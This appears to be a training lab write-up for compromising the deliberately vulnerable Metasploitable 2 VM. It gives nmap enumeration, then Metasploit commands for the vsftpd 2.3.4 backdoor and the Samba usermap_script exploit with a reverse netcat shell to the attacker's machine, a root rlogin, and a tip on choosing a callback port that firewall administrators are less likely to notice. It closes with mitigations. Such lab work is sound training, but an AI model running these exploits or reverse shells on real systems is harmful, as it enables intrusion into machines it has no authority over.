# Challenge 02: Exploiting Vulnerable Server Services

## Scenario
During a routine network scan, a previously unknown server has been discovered. Initial checks suggest it might be an older, unpatched machine running several services. Your task is to perform a full security assessment of this server to identify and exploit any vulnerabilities, determine the level of risk it poses, and provide recommendations for mitigation.

---

## Objective
- Discover and enumerate all running services on the target server.
- Identify actionable vulnerabilities in the running services.
- Gain unauthorized access (an initial shell) to the server by exploiting a vulnerability.
- Escalade privileges to gain root-level control over the machine.

---

## Environment

### Attacker
- OS: Kali Linux
- IP: 192.168.1.144

### Target Server
- OS: Metasploitable 2 (Purposefully Vulnerable Linux VM)
- IP Address: 192.168.1.60

---

## Tools Used
- `netdiscover`
- `nmap` or `zenmap`
- `msfconsole` (Metasploit Framework)

---

## Attack Overview
1.  **Phase 1: Network Discovery & Enumeration:** Find the target server on the network and perform detailed port and service scanning.
2.  **Phase 2: Gaining Shell Access (Exploitation):** Analyze the scan results, identify vulnerable services, and use various methods to gain unauthorized shell access.

---
## Steps to Reproduce

### Phase 1: Network Discovery & Enumeration

#### Step 1: Initial Host Discovery
First, we need to identify all live hosts on the network to find our target machine.

1.  Use `netdiscover` for a rapid, real-time view of hosts detected on the network. This provides a general sense of active devices.
```bash
netdiscover -r 192.168.1.0/24
```
2.  A more effective method to identify the Metasploitable 2 machine is by its numerous open ports. Use `zenmap` (specifically its "Quick scan" profile) or `nmap` directly to rapidly check for common open ports on all hosts in your subnet.
```bash
# Command for a quick scan across the entire subnet (e.g., in Zenmap's "Command" field)
nmap -T4 -F 192.168.1.0/24
```
*From the scan results, look for an IP address (likely `192.168.1.60`) with many open ports (such as FTP, SSH, Telnet, SMTP, etc.). This IP belongs to your Metasploitable 2 target.*
![Zenmap Quick Scan Results](./images/zenmap_quick_scan.png)

#### Step 2: Detailed Service Enumeration
Once you have identified the target's IP address (`192.168.1.60`), perform a comprehensive and aggressive scan with the "Intense scan" profile on that specific host to gather detailed information about its running services, versions, and operating system.
```bash
nmap -T4 -A -v 192.168.1.60
```
*This aggressive scan will take longer but will provide crucial version information needed to find an exploit in the next phase.*
![Zenmap Intense Scan Results](./images/zenmap_intense_scan.png)

### Phase 2: Gaining Shell Access

#### Step 1: Identify Vulnerable Services
Analyze the detailed `nmap` results to identify potentially vulnerable services. Metasploitable 2 commonly features:
*   `vsftpd 2.3.4` (FTP server)
*   `netkit-rsh rexecd` (Remote Shell service)
*   `Samba smbd 3.X - 4.X` (SMB/CIFS service)

The `nmap` output might look similar to this:
```
512/tcp  open  exec        netkit-rsh rexecd
21/tcp   open  ftp         vsftpd 2.3.4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

#### Step 2: Exploiting Services to Gain Shell Access
This challenge demonstrates three different methods to gain a root shell. You can choose any of these paths.

##### Method 1: Exploiting `netkit-rsh rexecd` (Direct RLOGIN)
The `netkit-rsh rexecd` service is often misconfigured to allow remote root login without a password from trusted hosts. On Metasploitable 2, it can often be exploited directly.
1.  Execute the `rlogin` command
```bash
rlogin -l root 192.168.1.60
```
*If successful, you will immediately gain a root shell on the target server.*

##### Method 2: Exploiting `vsftpd 2.3.4` (Metasploit Backdoor)
The `vsftpd 2.3.4` version on Metasploitable 2 contains a backdoor that can be exploited using Metasploit.
1.  Launch `msfconsole`
```bash
msfconsole
```

2.  Search for the exploit
```
msf > search vsftpd_234_backdoor
```

3.  Select and configure the exploit module
```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.60
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

##### Method 3: Exploiting `Samba smbd` (Metasploit `usermap_script`)
The `Samba usermap_script` vulnerability allows an attacker to execute arbitrary commands with root privileges through the Samba service.
1.  Launch `msfconsole`
```bash
msfconsole
```
2.  Search for the exploit
```
msf > search usermap_script
```

3.  Select and configure the exploit module and payload
```
msf > use exploit/multi/samba/usermap_script
msf exploit(unix/samba/usermap_script) > set RHOSTS 192.168.1.60
msf exploit(unix/samba/usermap_script) > set LHOST 192.168.1.144
msf exploit(unix/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat
msf exploit(unix/samba/usermap_script) > exploit
```
*This exploit will attempt to connect back to your attacker machine (`LHOST`) on a default port. If successful, you will receive a root shell in your `msfconsole`.*
**Tip:** You can often use common ports like 80 for `LPORT` (if not already in use) as they are rarely filtered and less suspicious for firewall administrators.

## Results
- Successfully discovered the target server on the network.
- Gained unauthorized root shell access by exploiting a vulnerable network service.

---

## Impact
- An attacker can read, modify, or delete any data on the server, install malware, or use it as a pivot point.
- The compromised server can be used to attack other machines on the internal network.
- The attacker could easily shut down the server or its services, causing a business interruption.

---

## Mitigation & Defensive Measures
- **Patch Management:** Regularly scan for and apply security patches to all operating systems and services. This is the most critical defense against known vulnerabilities.
- **Firewall & Network Access Controls:** Implement strong firewall rules to restrict access to services, only exposing those that are absolutely necessary.
- **Principle of Least Privilege:** Run services with the minimum necessary privileges. Avoid running services as the `root` user whenever possible.
- **Vulnerability Scanning:** Proactively run authenticated and unauthenticated vulnerability scans (e.g., with Nessus, OpenVAS, Nexpose by Rapid7) to identify weaknesses before an attacker does.
- **Intrusion Detection Systems (IDS):** Use an IDS to monitor for and alert on common attack signatures, such as those used by Metasploit exploits.
- **Disable Unnecessary Services:** Turn off any services that are not essential for the server's function.

---

## Lessons Learned
- Unpatched services are the most common entry points for attackers.
- Multiple vulnerabilities often exist on a single, poorly maintained server.
- Gaining initial access often leads directly to root access on misconfigured systems.
- Robust defense-in-depth strategies (patching, firewalls, least privilege) are essential to protect servers from exploitation.
